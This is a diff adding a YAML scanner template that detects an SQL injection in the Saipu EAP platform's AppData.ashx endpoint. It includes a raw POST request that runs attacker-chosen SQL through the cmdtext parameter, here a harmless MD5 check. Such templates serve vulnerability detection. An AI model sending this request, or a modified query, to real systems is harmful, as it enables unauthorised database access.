@@ -1,0 +1,37 @@
+id: poc-yaml-chinasap-eap-appdata-apsx-sqli
+info:
+  name: 赛普EAP企业适配管理平台 AppData.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    赛普EAP企业适配管理平台存在SQL注入漏洞，通过发送特制的POST请求可以触发漏洞。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /IDWebSoft/AppData.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=GetDataTableByText&cmdtext=select sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'));
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"ExceptionMsg\":"
+          - "\"ResultText\":"
+          - "0x{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
